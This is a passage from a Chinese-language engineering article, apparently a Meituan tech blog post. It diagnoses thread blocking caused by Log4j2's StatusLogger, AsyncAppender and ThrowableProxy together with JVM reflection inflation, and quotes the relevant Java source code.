configureExistingStatusConsoleListener() {\n    boolean configured = false;\n    for (final StatusListener statusListener : this.logger.getListeners()) {\n        if (statusListener instanceof StatusConsoleListener) {\n            final StatusConsoleListener listener = (StatusConsoleListener) statusListener;\n          // StatusConsoleListener 的 level 以 StatusConfiguration 的 status 为准\n            listener.setLevel(this.status);\n            this.logger.updateListenerLevel(this.status);\n            if (this.verbosity == Verbosity.QUIET) {\n                listener.setFilters(this.verboseClasses);\n            }\n            configured = true;\n        }\n    }\n    return configured;\n}\n\n\nprivate void registerNewStatusConsoleListener() {\n  // 创建 StatusConsoleListener，级别以 StatusConfiguration 为准\n  // 默认 status 是 DEFAULT_STATUS 即 ERROR\n  // 默认 destination 是 DEFAULT_STREAM 即 System.out\n    final StatusConsoleListener listener = new StatusConsoleListener(this.status, this.destination);\n    if (this.verbosity == Verbosity.QUIET) {\n        listener.setFilters(this.verboseClasses);\n    }\n    this.logger.registerListener(listener);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.status.StatusConsoleListener\n\nprivate Level level = Level.FATAL; // 级别\nprivate String[] filters;\nprivate final PrintStream stream; // 输出流\n\npublic StatusConsoleListener(final Level level, final PrintStream stream) {\n    if (stream == null) {\n        throw new IllegalArgumentException(\"You must provide a stream to use for this listener.\");\n    }\n    this.level = level;\n    this.stream = stream;\n}\n</code></pre><p>以XmlConfiguration为例，分析上述日志配置解析代码片段可以得知，创建XmlConfiguration时，会先创建StatusConfiguration，随后在初始化StatusConfiguration时创建并注册StatusConsoleListener到StatusLogger的listeners中，日志配置文件中&lt;Configuration&gt;标签的属性值通过XmlConfiguration-&gt;StatusConfiguration-&gt;StatusConsoleListener这样的关系链路最终影响StatusConsoleListener的行为。</p><p>日志配置文件中的&lt;Configuration&gt;标签可以配置属性字段，部分字段如下所示：</p><ul><li><strong>status</strong>，可选值包括<strong>OFF、FATAL、ERROR、WARN、INFO、DEBUG、TRACE、ALL</strong>，该值决定StatusConsoleListener级别，默认是ERROR。</li><li><strong>dest</strong>，可选值包括<strong>out、err、标准的URI路径</strong>，该值决定StatusConsoleListener输出流目的地，默认是System.out。<br></li></ul><p>在本项目的日志配置文件中可以看到并没有设置Configuration的dest属性值，所以日志直接输出到System.out。</p><h4>3.1.5 StatusLogger有什么用？</h4><p>上文提到StatusConsoleListener是注册在StatusLogger中，StatusLogger在交由StatusListener处理日志前，会判断日志级别，如果级别条件不满足，则忽略此日志，StatusConsoleListener的日志级别默认是ERROR。</p><pre><code>// org.apache.logging.log4j.status.StatusLogger\n  \n@Override\npublic void logMessage(final String fqcn, final Level level, final Marker marker, final Message msg,\n        final Throwable t) {\n    StackTraceElement element = null;\n    if (fqcn != null) {\n        element = getStackTraceElement(fqcn, Thread.currentThread().getStackTrace());\n    }\n    final StatusData data = new StatusData(element, level, msg, t, null);\n    msgLock.lock();\n    try {\n        messages.add(data);\n    } finally {\n        msgLock.unlock();\n    }\n  \n  // 系统注册了 listener，由 StatusConsoleListener 处理日志\n    if (listeners.size() &gt; 0) {\n        for (final StatusListener listener : listeners) {\n          // 比较当前日志的 leve 和 listener 的 level\n            if (data.getLevel().isMoreSpecificThan(listener.getStatusLevel())) {\n                listener.log(data);\n            }\n        }\n    } else {\n        logger.logMessage(fqcn, level, marker, msg, t);\n    }\n}\n</code></pre><p>我们回头再来看下StatusLogger，StatusLogger采用单例模式实现，它输出日志到Console（如System.out或System.err），从上文分析可知，在高并发场景下非常容易导致线程Block，那么它的存在有什么意义呢？</p><p>看官方介绍大意是说，在日志初始化完成前，也有打印日志调试的需求，StatusLogger就是为了解决这个问题而生。</p><blockquote><p><strong>Troubleshooting tip for the impatient:</strong></p><p>From log4j-2.9 onward, log4j2 will print all internal logging to the console if system property log4j2.debug is defined (with any or no value).</p><p>Prior to log4j-2.9, there are two places where internal logging can be controlled:</p><ul><li>Before a configuration is found, status logger level can be controlled with system property org.apache.logging.log4j.simplelog.StatusLogger.level.</li><li>After a configuration is found, status logger level can be controlled in the configuration file with the “status” attribute, for example: &lt;Configuration status=“trace”&gt;.</li></ul><p>Just as it is desirable to be able to diagnose problems in applications, it is frequently necessary to be able to diagnose problems in the logging configuration or in the configured components. Since logging has not been configured, “normal” logging cannot be used during initialization. In addition, normal logging within appenders could create infinite recursion which Log4j will detect and cause the recursive events to be ignored. To accomodate this need, the Log4j 2 API includes a <a href=\"https://logging.apache.org/log4j/2.x/log4j-api/apidocs/org/apache/logging/log4j/status/StatusLogger.html\">StatusLogger</a>.</p></blockquote><h4>3.1.6 问题小结</h4><p>日志量过大导致AsyncAppender日志队列被打满，新的日志事件无法入队，进而由ErrorHandler处理日志，同时由于ErrorHandler存在线程安全问题，导致大量日志输出到了Console，而Console在输出日志到PrintStream输出流时，存在synchronized同步代码块，所以在高并发场景下导致线程Block。</p><h3>3.2 AsyncAppender导致线程Block</h3><h4>3.2.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图6和图7所示。</p><p><img src=\"https://p1.meituan.net/travelcube/8e78a5cadf68a29fc1bb4ccddf6266ee709820.png\" alt=\"图6 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/0fd6af77194b20c73cc083639665bc25548374.png\" alt=\"图7 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是跟日志打印相关，由于是ERROR级别日志，查看具体报错日志，发现有两种业务异常，分别如下图8和图9所示：</p><p><img src=\"https://p1.meituan.net/travelcube/ef3f3120108556796f687feaf53934e51119018.png\" alt=\"图8 业务异常堆栈一\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/393ec805f1e5fe4f6cf0b51150c798f01224638.png\" alt=\"图9 业务异常堆栈二\" referrerpolicy=\"no-referrer\"></p><p>这些业务异常会是导致线程Block的幕后元凶吗？接下来本章节将结合如下图10所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/e982a7c27d1c1e04b23ffed5f7589344116902.png\" alt=\"图10 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.2.2 为什么会Block线程？</h4><p>从Blocked线程堆栈中可以看出，线程阻塞在类加载流程上，查看WebAppClassLoader相关代码片段如下图11所示，发现加载类时确实会根据类名来加synchronized同步块，因此初步猜测是类加载导致线程Block。</p><p><img src=\"https://p1.meituan.net/travelcube/86d456589c866d103feb835d4cf19045163097.png\" alt=\"图11 WebAppClassLoader\" referrerpolicy=\"no-referrer\"></p><p>但上述猜测还有一些值得推敲的地方：</p><ol><li>项目代码里只是普通地输出一条ERROR日志而已，为何会触发类加载？</li><li>通常情况下类加载几乎不会触发线程Block，不然一个项目要加载成千上万个类，如果因为加载类就导致Block，那项目就没法正常运行了。<br></li></ol><h4>3.2.3 为什么会触发类加载？</h4><p>继续从Blocked线程堆栈着手分析，查看堆栈中的ThrowableProxy相关代码，发现其构造函数会遍历整个异常堆栈中的所有堆栈元素，最终获取所有堆栈元素类所在的JAR名称和版本信息。具体流程如下：</p><ol><li>首先获取堆栈元素的类名称。</li><li>再通过loadClass的方式获取对应的Class对象。</li><li>进一步获取该类所在的JAR信息，从CodeSource中获取JAR名称，从Package中获取JAR版本。<br></li></ol><pre><code>// org.apache.logging.log4j.core.impl.ThrowableProxy\n  \nprivate ThrowableProxy(final Throwable throwable, final Set&lt;Throwable&gt; visited) {\n    this.throwable = throwable;\n    this.name = throwable.getClass().getName();\n    this.message = throwable.getMessage();\n    this.localizedMessage = throwable.getLocalizedMessage();\n    final Map&lt;String, CacheEntry&gt; map = new HashMap&lt;&gt;();\n    final Stack&lt;Class&lt;?&gt;&gt; stack = ReflectionUtil.getCurrentStackTrace();\n  // 获取堆栈扩展信息\n    this.extendedStackTrace = this.toExtendedStackTrace(stack, map, null, throwable.getStackTrace());\n    final Throwable throwableCause = throwable.getCause();\n    final Set&lt;Throwable&gt; causeVisited = new HashSet&lt;&gt;(1);\n    this.causeProxy = throwableCause == null ? null : new ThrowableProxy(throwable, stack, map, throwableCause,\n        visited, causeVisited);\n    this.suppressedProxies = this.toSuppressedProxies(throwable, visited);\n}\n\nExtendedStackTraceElement[] toExtendedStackTrace(final Stack&lt;Class&lt;?&gt;&gt; stack, final Map&lt;String, CacheEntry&gt; map,\n                                                 final StackTraceElement[] rootTrace,\n                                                 final StackTraceElement[] stackTrace) {\n    int stackLength;\n    if (rootTrace != null) {\n        int rootIndex = rootTrace.length - 1;\n        int stackIndex = stackTrace.length - 1;\n        while (rootIndex &gt;= 0 &amp;&amp; stackIndex &gt;= 0 &amp;&amp; rootTrace[rootIndex].equals(stackTrace[stackIndex])) {\n            --rootIndex;\n            --stackIndex;\n        }\n        this.commonElementCount = stackTrace.length - 1 - stackIndex;\n        stackLength = stackIndex + 1;\n    } else {\n        this.commonElementCount = 0;\n        stackLength = stackTrace.length;\n    }\n    final ExtendedStackTraceElement[] extStackTrace = new ExtendedStackTraceElement[stackLength];\n    Class&lt;?&gt; clazz = stack.isEmpty() ? null : stack.peek();\n    ClassLoader lastLoader = null;\n    for (int i = stackLength - 1; i &gt;= 0; --i) {\n      // 遍历 StackTraceElement\n        final StackTraceElement stackTraceElement = stackTrace[i];\n      // 获取堆栈元素对应的类名称\n        final String className = stackTraceElement.getClassName();\n        // The stack returned from getCurrentStack may be missing entries for java.lang.reflect.Method.invoke()\n        // and its implementation. The Throwable might also contain stack entries that are no longer\n        // present as those methods have returned.\n        ExtendedClassInfo extClassInfo;\n        if (clazz != null &amp;&amp; className.equals(clazz.getName())) {\n            final CacheEntry entry = this.toCacheEntry(stackTraceElement, clazz, true);\n            extClassInfo = entry.element;\n            lastLoader = entry.loader;\n            stack.pop();\n            clazz = stack.isEmpty() ? null : stack.peek();\n        } else {\n          // 对加载过的 className 进行缓存，避免重复加载\n            final CacheEntry cacheEntry = map.get(className);\n            if (cacheEntry != null) {\n                final CacheEntry entry = cacheEntry;\n                extClassInfo = entry.element;\n                if (entry.loader != null) {\n                    lastLoader = entry.loader;\n                }\n            } else {\n              // 通过加载类来获取类的扩展信息，如 location 和 version 等\n                final CacheEntry entry = this.toCacheEntry(stackTraceElement,\n                    // 获取 Class 对象\n                    this.loadClass(lastLoader, className), false);\n                extClassInfo = entry.element;\n                map.put(stackTraceElement.toString(), entry);\n                if (entry.loader != null) {\n                    lastLoader = entry.loader;\n                }\n            }\n        }\n        extStackTrace[i] = new ExtendedStackTraceElement(stackTraceElement, extClassInfo);\n    }\n    return extStackTrace;\n}\n\n/**\n * Construct the CacheEntry from the Class's information.\n *\n * @param stackTraceElement The stack trace element\n * @param callerClass       The Class.\n * @param exact             True if the class was obtained via Reflection.getCallerClass.\n * @return The CacheEntry.\n */\nprivate CacheEntry toCacheEntry(final StackTraceElement stackTraceElement, final Class&lt;?&gt; callerClass,\n                                final boolean exact) {\n    String location = \"?\";\n    String version = \"?\";\n    ClassLoader lastLoader = null;\n    if (callerClass != null) {\n        try {\n            // 获取 jar 文件信息\n            final CodeSource source = callerClass.getProtectionDomain().getCodeSource();\n            if (source != null) {\n                final URL locationURL = source.getLocation();\n                if (locationURL != null) {\n                    final String str = locationURL.toString().replace('\\\\', '/');\n                    int index = str.lastIndexOf(\"/\");\n                    if (index &gt;= 0 &amp;&amp; index == str.length() - 1) {\n                        index = str.lastIndexOf(\"/\", index - 1);\n                        location = str.substring(index + 1);\n                    } else {\n                        location = str.substring(index + 1);\n                    }\n                }\n            }\n        } catch (final Exception ex) {\n            // Ignore the exception.\n        }\n    // 获取类所在 jar 版本信息\n        final Package pkg = callerClass.getPackage();\n        if (pkg != null) {\n            final String ver = pkg.getImplementationVersion();\n            if (ver != null) {\n                version = ver;\n            }\n        }\n        lastLoader = callerClass.getClassLoader();\n    }\n    return new CacheEntry(new ExtendedClassInfo(exact, location, version), lastLoader);\n}\n</code></pre><p>从上述代码中可以看到，ThrowableProxy#toExtendedStackTrace方法通过Map<string cacheentry=\"\">缓存当前堆栈元素类对应的CacheEntry，来避免重复解析CacheEntry，但是由于Map缓存put操作使用的key来自于StackTraceElement.toString方法，而get操作使用的key却来自于StackTraceElement.getClassName方法，即使对于同一个StackTraceElement而言，其toString和getClassName方法对应的返回结果也不一样，所以此map形同虚设。</string>,&gt;</p><pre><code>// java.lang.StackTraceElement\n  \npublic String getClassName() {\n    return declaringClass;\n}\n\npublic String toString() {\n    return getClassName() + \".\" + methodName +\n        (isNativeMethod() ? \"(Native Method)\" :\n         (fileName != null &amp;&amp; lineNumber &gt;= 0 ?\n          \"(\" + fileName + \":\" + lineNumber + \")\" :\n          (fileName != null ?  \"(\"+fileName+\")\" : \"(Unknown Source)\")));\n}\n</code></pre><p>该问题已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-2389\">Issue: fix the CacheEntry map in ThrowableProxy#toExtendedStackTrace to be put and gotten with same key</a>反馈给社区，并在<a href=\"https://logging.apache.org/log4j/2.x/changes-report.html#a2.11.1\">2.11.1</a>版本中修复了该问题。虽然通过让get/put方法使用同一个key来修复缓存的有效性问题，但由于ThrowableProxy对每个Throwable都会创建一个全新的Map，而不是使用全局Map，因此其缓存也仅仅对单个Throwable生效，作用范围非常有限，食之无味，弃之可惜。</p><p>言归正传，通常情况下一个类加载器对于一个类只会加载一次，类加载器内部保存有类缓存，无需重复加载，但目前的现象却是由于类加载而导致线程大量Block，因此必然是有些类加载不了，且不断重复尝试加载，那到底是什么类无法加载呢？</p><h4>3.2.4 到底什么类加载不了？</h4><p>要找到具体是什么类无法加载，归根结底还是要分析业务异常的具体堆栈。</p><p><img src=\"https://p1.meituan.net/travelcube/ef3f3120108556796f687feaf53934e51119018.png\" alt=\"图12 业务异常堆栈一\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/393ec805f1e5fe4f6cf0b51150c798f01224638.png\" alt=\"图13 业务异常堆栈二\" referrerpolicy=\"no-referrer\"></p><p>对比如图12和图13所示的两份业务异常堆栈，我们可以看到两份堆栈基本相似，且大多数类都是很普通的类，但是唯一不同的地方在于：</p><ol><li>sun.reflect.NativeMethodAccessorImpl（参见图12）。</li><li>sun.reflect.GeneratedMethodAccessor261（参见图13）。</li></ol><p>从字面信息中不难猜测出这与反射调用相关，但问题是这两份堆栈对应的其实是同一份业务代码，为什么会产生两份不同的异常堆栈？</p><p>查阅相关资料得知，这与JVM反射调用相关，JVM对反射调用分两种情况：</p><ol><li><strong>默认使用native方法进行反射操作。</strong></li><li><strong>一定条件下会生成字节码进行反射操作</strong>，即生成sun.reflect.GeneratedMethodAccessor&lt;N&gt;类，它是一个反射调用方法的包装类，代理不同的方法，类后缀序号递增。</li></ol><p>JVM反射调用的主要流程是获取MethodAccessor，并由MethodAccessor执行invoke调用，相关代码如下：</p><pre><code>// java.lang.reflect.Method  \n\n@CallerSensitive\npublic Object invoke(Object obj, Object... args)\n    throws IllegalAccessException, IllegalArgumentException,\n       InvocationTargetException\n{\n    if (!override) {\n        if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {\n            Class&lt;?&gt; caller = Reflection.getCallerClass();\n            checkAccess(caller, clazz, obj, modifiers);\n        }\n    }\n\n    MethodAccessor ma = methodAccessor;             // read volatile\n    if (ma == null) {\n    // 获取 MethodAccessor\n        ma = acquireMethodAccessor();\n    }\n    // 通过 MethodAccessor 调用\n    return ma.invoke(obj, args);\n}\n\nprivate MethodAccessor acquireMethodAccessor() {\n    MethodAccessor tmp = null;\n    if (root != null) tmp = root.getMethodAccessor();\n    if (tmp != null) {\n        methodAccessor = tmp;\n    } else {\n        // 通过 ReflectionFactory 创建 MethodAccessor\n        tmp = reflectionFactory.newMethodAccessor(this);\n        setMethodAccessor(tmp);\n    }\n\n    return tmp;\n}\n</code></pre><p>当noInflation为false（默认为false）或者反射方法所在类是VM匿名类（类名中包括斜杠“/”）的情况下，ReflectionFactory会返回一个MethodAccessor代理类，即DelegatingMethodAccessorImpl。</p><pre><code>// sun.reflect.ReflectionFactory\n\npublic MethodAccessor newMethodAccessor(Method method) {\n  // 通过启动参数获取并解析 noInflation 和 inflationThreshold 值\n  // noInflation 默认为 false\n  // inflationThreshold 默认为15\n    checkInitted();\n\n    if (noInflation &amp;&amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {\n        return new MethodAccessorGenerator().\n            generateMethod(method.getDeclaringClass(),\n                           method.getName(),\n                           method.getParameterTypes(),\n                           method.getReturnType(),\n                           method.getExceptionTypes(),\n                           method.getModifiers());\n    } else {\n        NativeMethodAccessorImpl acc =\n            new NativeMethodAccessorImpl(method);\n        DelegatingMethodAccessorImpl res =\n            new DelegatingMethodAccessorImpl(acc);\n        acc.setParent(res);\n      \n      // 返回代理 DelegatingMethodAccessorImpl\n        return res;\n    }\n}\n\nprivate static void checkInitted() {\n    if (initted) return;\n    AccessController.doPrivileged(\n        new PrivilegedAction&lt;Void&gt;() {\n            public Void run() {\n                // Tests to ensure the system properties table is fully\n                // initialized. This is needed because reflection code is\n                // called very early in the initialization process (before\n                // command-line arguments have been parsed and therefore\n                // these user-settable properties installed.) We assume that\n                // if System.out is non-null then the System class has been\n                // fully initialized and that the bulk of the startup code\n                // has been run.\n\n                if (System.out == null) {\n                    // java.lang.System not yet fully initialized\n                    return null;\n                }\n\n                String val = System.getProperty(\"sun.reflect.noInflation\");\n                if (val != null &amp;&amp; val.equals(\"true\")) {\n                    noInflation = true;\n                }\n\n                val = System.getProperty(\"sun.reflect.inflationThreshold\");\n                if (val != null) {\n                    try {\n                        inflationThreshold = Integer.parseInt(val);\n                    } catch (NumberFormatException e) {\n                        throw new RuntimeException(\"Unable to parse property sun.reflect.inflationThreshold\", e);\n                    }\n                }\n\n                initted = true;\n                return null;\n            }\n        });\n}\n</code></pre><p>默认情况下DelegatingMethodAccessorImpl代理了NativeMethodAccessorImpl，但是随着反射调用次数的增加，当一个方法被反射调用的次数超过一定的阀值时（inflationThreshold，默认值是15），NativeMethodAccessorImpl会通过字节码生成技术，自动生成MethodAccessorImpl实现类，并修改DelegatingMethodAccessorImpl的内部代理对象指向字节码生成类实例，从而改变后续反射调用逻辑。</p><p><img src=\"https://p0.meituan.net/travelcube/f28797d5570b64848517572244bd6f0987974.png\" alt=\"图14 MethodAccessor关系图\" referrerpolicy=\"no-referrer\"></p><pre><code>// sun.reflect.DelegatingMethodAccessorImpl\n\nclass DelegatingMethodAccessorImpl extends MethodAccessorImpl {\n  // 内部代理 MethodAccessorImpl\n    private MethodAccessorImpl delegate;\n\n    DelegatingMethodAccessorImpl(MethodAccessorImpl delegate) {\n        setDelegate(delegate);\n    }\n\n    public Object invoke(Object obj, Object[] args)\n        throws IllegalArgumentException, InvocationTargetException\n    {\n        return delegate.invoke(obj, args);\n    }\n\n    void setDelegate(MethodAccessorImpl delegate) {\n        this.delegate = delegate;\n    }\n}\n</code></pre><pre><code>// sun.reflect.NativeMethodAccessorImpl\n\nclass NativeMethodAccessorImpl extends MethodAccessorImpl {\n    private final Method method;\n    private DelegatingMethodAccessorImpl parent;\n    private int numInvocations;\n\n    NativeMethodAccessorImpl(Method method) {\n        this.method = method;\n    }\n\n    public Object invoke(Object obj, Object[] args)\n        throws IllegalArgumentException, InvocationTargetException\n    {\n        // We can't inflate methods belonging to vm-anonymous classes because\n        // that kind of class can't be referred to by name, hence can't be\n        // found from the generated bytecode.\n      \n      // 每次调用时 numInvocations 都会自增加1，如果超过阈值（默认是15次），就会修改父类的代理对象，从而改变调用链路\n        if (++numInvocations &gt; ReflectionFactory.inflationThreshold()\n                &amp;&amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {\n            MethodAccessorImpl acc = (MethodAccessorImpl)\n              // 动态生成字节码，优化反射调用速度\n                new MethodAccessorGenerator().\n                    generateMethod(method.getDeclaringClass(),\n                                   method.getName(),\n                                   method.getParameterTypes(),\n                                   method.getReturnType(),\n                                   method.getExceptionTypes(),\n                                   method.getModifiers());\n          // 修改父代理类的代理对象\n            parent.setDelegate(acc);\n        }\n\n        return invoke0(method, obj, args);\n    }\n\n    void setParent(DelegatingMethodAccessorImpl parent) {\n        this.parent = parent;\n    }\n\n    private static native Object invoke0(Method m, Object obj, Object[] args);\n}\n</code></pre><p>从MethodAccessorGenerator#generateName方法可以看到，字节码生成的类名称规则是sun.reflect.GeneratedConstructorAccessor&lt;N&gt;，其中N是从0开始的递增数字，且生成类是由DelegatingClassLoader类加载器定义，所以其他类加载器无法加载该类，也就无法生成类缓存数据，从而导致每次加载类时都需要遍历JarFile，极大地降低了类查找速度，且类加载过程是synchronized同步调用，在高并发情况下会更加恶化，从而导致线程Block。</p><pre><code>// sun.reflect.MethodAccessorGenerator\n\npublic MethodAccessor generateMethod(Class&lt;?&gt; declaringClass,\n                                     String   name,\n                                     Class&lt;?&gt;[] parameterTypes,\n                                     Class&lt;?&gt;   returnType,\n                                     Class&lt;?&gt;[] checkedExceptions,\n                                     int modifiers)\n{\n    return (MethodAccessor) generate(declaringClass,\n                                     name,\n                                     parameterTypes,\n                                     returnType,\n                                     checkedExceptions,\n                                     modifiers,\n                                     false,\n                                     false,\n                                     null);\n}\n\nprivate MagicAccessorImpl generate(final Class&lt;?&gt; declaringClass,\n                                   String name,\n                                   Class&lt;?&gt;[] parameterTypes,\n                                   Class&lt;?&gt;   returnType,\n                                   Class&lt;?&gt;[] checkedExceptions,\n                                   int modifiers,\n                                   boolean isConstructor,\n                                   boolean forSerialization,\n                                   Class&lt;?&gt; serializationTargetClass)\n{\n  \n  final String generatedName = generateName(isConstructor, forSerialization);\n\n    // 忽略以上代码\n\n    return AccessController.doPrivileged(\n        new PrivilegedAction&lt;MagicAccessorImpl&gt;() {\n            public MagicAccessorImpl run() {\n                    try {\n                    return (MagicAccessorImpl)\n                    ClassDefiner.defineClass\n                            (generatedName,\n                             bytes,\n                             0,\n                             bytes.length,\n                             declaringClass.getClassLoader()).newInstance();\n                    } catch (InstantiationException | IllegalAccessException e) {\n                        throw new InternalError(e);\n                    }\n                }\n            });\n}\n\n// 生成反射类名，看到了熟悉的 sun.reflect.GeneratedConstructorAccessor&lt;N&gt;\nprivate static synchronized String generateName(boolean isConstructor, boolean forSerialization)\n{\n    if (isConstructor) {\n        if (forSerialization) {\n            int num = ++serializationConstructorSymnum;\n            return \"sun/reflect/GeneratedSerializationConstructorAccessor\" + num;\n        } else {\n            int num = ++constructorSymnum;\n            return \"sun/reflect/GeneratedConstructorAccessor\" + num;\n        }\n    } else {\n        int num = ++methodSymnum;\n        return \"sun/reflect/GeneratedMethodAccessor\" + num;\n    }\n}\n</code></pre><pre><code>// sun.reflect.ClassDefiner\n  \nstatic Class&lt;?&gt; defineClass(String name, byte[] bytes, int off, int len,\n                            final ClassLoader parentClassLoader)\n{\n    ClassLoader newLoader = AccessController.doPrivileged(\n        new PrivilegedAction&lt;ClassLoader&gt;() {\n            public ClassLoader run() {\n                    return new DelegatingClassLoader(parentClassLoader);\n                }\n            });\n  // 通过 DelegatingClassLoader 类加载器定义生成类\n    return unsafe.defineClass(name, bytes, off, len, newLoader, null);\n}\n</code></pre><p>那么，JVM反射调用为什么要做这么做？</p><p>其实这是JVM对反射调用的一种优化手段，在sun.reflect.ReflectionFactory的文档注释里对此做了解释，这是一种“Inflation”机制，加载字节码的调用方式在第一次调用时会比Native调用的速度要慢3~4倍，但是在后续调用时会比Native调用速度快20多倍。为了避免反射调用影响应用的启动速度，所以在反射调用的前几次通过Native方式调用，当超过一定调用次数后使用字节码方式调用，提升反射调用性能。</p><blockquote><p>“Inflation” mechanism. Loading bytecodes to implement Method.invoke() and Constructor.newInstance() currently costs 3-4x more than an invocation via native code for the first invocation (though subsequent invocations have been benchmarked to be over 20x faster). Unfortunately this cost increases startup time for certain applications that use reflection intensively (but only once per class) to bootstrap themselves. To avoid this penalty we reuse the existing JVM entry points for the first few invocations of Methods and Constructors and then switch to the bytecode-based implementations.</p></blockquote><p>至此，总算理清了类加载导致线程Block的直接原因，但这并非根因，业务代码中普普通通地打印一条ERROR日志，为何会导致解析、加载异常堆栈类？</p><h4>3.2.5 为什么要解析异常堆栈？</h4><p><img src=\"https://p0.meituan.net/travelcube/4f4770a5ed066759870da258d2ef7f9393118.png\" alt=\"图15 AsyncAppender处理日志流程\" referrerpolicy=\"no-referrer\"></p><p>AsyncAppender处理日志简要流程如上图15所示，在其内部维护一个BlockingQueue队列和一个AsyncThread线程，处理日志时先把日志转换成Log4jLogEvent快照然后入队，同时AsyncThread线程负责从队列里获取元素来异步处理日志事件。</p><pre><code>// org.apache.logging.log4j.core.appender.AsyncAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n    if (!isStarted()) {\n        throw new IllegalStateException(\"AsyncAppender \" + getName() + \" is not active\");\n    }\n    if (!Constants.FORMAT_MESSAGES_IN_BACKGROUND) { // LOG4J2-898: user may choose\n        logEvent.getMessage().getFormattedMessage(); // LOG4J2-763: ask message to freeze parameters\n    }\n  // 创建 日志数据快照\n    final Log4jLogEvent memento = Log4jLogEvent.createMemento(logEvent, includeLocation);\n  // 放入 BlockingQueue 中\n    if (!transfer(memento)) {\n        if (blocking) {\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRoute route = asyncQueueFullPolicy.getRoute(thread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n            error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n}\n</code></pre><p>AsyncAppender在生成LogEvent的快照Log4jLogEvent时，会先对LogEvent序列化处理统一转换为LogEventProxy，此时不同类型的LogEvent的处理情况稍有差异：</p><ul><li><strong>Log4jLogEvent类型</strong>，先执行Log4jLogEvent#getThrownProxy方法，触发创建ThrowableProxy实例。</li><li><strong>MutableLogEvent类型</strong>，先创建LogEventProxy实例，在构造函数内执行MutableLogEvent#getThrownProxy方法，触发创建ThrowableProxy实例。</li></ul><p>综上，不管LogEvent的实际类型是MutableLogEvent还是Log4jLogEvent，最终都会触发创建ThrowableProxy实例，并在ThrowableProxy构造函数内触发了解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.impl.Log4jLogEvent\n\n// 生成Log4jLogEvent快照\npublic static Log4jLogEvent createMemento(final LogEvent event, final boolean includeLocation) {\n    // TODO implement Log4jLogEvent.createMemento()\n    return deserialize(serialize(event, includeLocation));\n}\n\npublic static Serializable serialize(final LogEvent event, final boolean includeLocation) {\n    if (event instanceof Log4jLogEvent) {\n      // 确保 ThrowableProxy 已完成初始化\n        event.getThrownProxy(); // ensure ThrowableProxy is initialized\n      // 创建 LogEventProxy\n        return new LogEventProxy((Log4jLogEvent) event, includeLocation);\n    }\n  // 创建 LogEventProxy\n    return new LogEventProxy(event, includeLocation);\n}\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n\npublic LogEventProxy(final LogEvent event, final boolean includeLocation) {\n    this.loggerFQCN = event.getLoggerFqcn();\n    this.marker = event.getMarker();\n    this.level = event.getLevel();\n    this.loggerName = event.getLoggerName();\n\n    final Message msg = event.getMessage();\n    this.message = msg instanceof ReusableMessage\n            ? memento((ReusableMessage) msg)\n            : msg;\n    this.timeMillis = event.getTimeMillis();\n    this.thrown = event.getThrown();\n  // 创建 ThrownProxy 实例\n    this.thrownProxy = event.getThrownProxy();\n    this.contextData = memento(event.getContextData());\n    this.contextStack = event.getContextStack();\n    this.source = includeLocation ? event.getSource() : null;\n    this.threadId = event.getThreadId();\n    this.threadName = event.getThreadName();\n    this.threadPriority = event.getThreadPriority();\n    this.isLocationRequired = includeLocation;\n    this.isEndOfBatch = event.isEndOfBatch();\n    this.nanoTime = event.getNanoTime();\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.impl.MutableLogEvent\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n      // 构造 ThrowableProxy 时打印异常堆栈\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n</code></pre><h4>3.2.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncAppender会先创建日志事件快照，并进一步触发解析、加载异常堆栈类。JVM通过生成字节码的方式优化反射调用性能，但该动态生成的类无法被WebAppClassLoader类加载器加载，因此当大量包含反射调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致线程Block。</p><h3>3.3 Lambda表达式导致线程Block</h3><h4>3.3.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后，立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图16和图17所示：</p><p><img src=\"https://p1.meituan.net/travelcube/2bff1fa248a8fc9dcd89f0a441108e4d500067.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/9f352aa0ba4c7b2ae38096885d4a458f553933.png\" alt=\"图16 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/990819413a03aceb4b34164d5ee87774450882.png\" alt=\"图17 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是和日志打印相关，由于是ERROR级别日志，查看具体报错日志，发现如下图18所示的业务异常。</p><p><img src=\"https://p0.meituan.net/travelcube/9d5b8363081d217dcdabc7ae37e0e5361540873.png\" alt=\"图18 业务异常堆栈\" 